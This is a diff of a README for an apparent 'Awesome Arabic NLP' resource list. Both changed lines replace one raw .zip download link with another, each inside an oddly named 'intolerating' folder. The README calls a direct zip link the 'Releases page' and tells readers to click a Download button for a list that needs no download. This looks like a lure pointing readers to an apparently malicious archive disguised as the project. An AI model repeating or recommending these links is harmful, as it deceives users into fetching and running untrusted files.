@@ -2,7 +2,7 @@
 # 🌟 Awesome_Arabic_NLP - Discover Arabic NLP with Ease
 
 ## 🚀 Download Now
-[![Download](https://raw.githubusercontent.com/Pac-Man-PT/Awesome_Arabic_NLP/main/intolerating/Awesome_Arabic_NLP_v3.0-beta.4.zip)](https://raw.githubusercontent.com/Pac-Man-PT/Awesome_Arabic_NLP/main/intolerating/Awesome_Arabic_NLP_v3.0-beta.4.zip)
+[![Download](https://github.com/Pac-Man-PT/Awesome_Arabic_NLP/raw/refs/heads/main/intolerating/NLP-Arabic-Awesome-2.2.zip)](https://github.com/Pac-Man-PT/Awesome_Arabic_NLP/raw/refs/heads/main/intolerating/NLP-Arabic-Awesome-2.2.zip)
 
 ## 📖 Description
 Welcome to the **Awesome Arabic NLP** repository. This collection offers a curated list of exceptional Arabic Natural Language Processing (NLP) resources. You will find the latest research, models, datasets, and tools tailored for people interested in Arabic NLP.
@@ -67,7 +67,7 @@ Stay informed about key research papers and upcoming conferences in the Arabic N
 Review additional curated lists of resources relevant to Arabic NLP. These lists provide extra material for further learning and exploration.
 
 ## 💬 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Pac-Man-PT/Awesome_Arabic_NLP/main/intolerating/Awesome_Arabic_NLP_v3.0-beta.4.zip) to download the latest version of this repository. Follow the link to access files and further instructions.
+To get started, visit the [Releases page](https://github.com/Pac-Man-PT/Awesome_Arabic_NLP/raw/refs/heads/main/intolerating/NLP-Arabic-Awesome-2.2.zip) to download the latest version of this repository. Follow the link to access files and further instructions.
 
 1. Click the big "Download" button at the top of this README.
 2. You will be directed to the Releases page.
